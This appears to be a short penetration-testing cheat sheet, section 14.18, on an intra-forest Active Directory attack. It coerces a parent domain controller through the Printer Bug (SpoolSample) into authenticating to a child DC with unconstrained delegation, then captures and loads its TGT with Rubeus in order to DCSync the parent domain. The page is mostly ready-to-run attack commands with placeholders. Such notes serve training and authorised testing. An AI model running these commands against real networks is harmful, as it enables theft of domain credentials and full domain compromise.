# 14.18 Unconstrained Delegation Printer Bug Intra-Forest

> Coerce the parent DC into authenticating to an unconstrained-delegation child DC via `SpoolSample`, capture its TGT, DCSync the parent.

## Overview

When a child DC has unconstrained delegation enabled (default for all DCs), use SpoolSample to force the parent DC to authenticate to the child DC via the Printer Bug (MS-RPRN flaw), capturing the parent DC's TGT. Use that TGT for DCSync on the parent domain.

## Steps

- Run **Rubeus monitor /interval:5** on the child DC to watch for incoming TGTs
- Run **SpoolSample** to coerce parent DC authentication to child DC
- Rubeus will capture the TGT for DC01$ (parent DC machine account)
- Use **Rubeus renew /ticket:... /ptt** to load the TGT into memory
- Execute **DCSync** against the parent domain with the loaded ticket

## Commands

### Rubeus monitor

```powershell
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
```

### SpoolSample

```powershell
PS C:\Tools> .\SpoolSample.exe dc01.<DOMAIN>.ad dc02.dev.<DOMAIN>.ad
```

### Rubeus renew

```powershell
PS C:\Tools> .\Rubeus.exe renew /ticket:<SNIP> /ptt
```
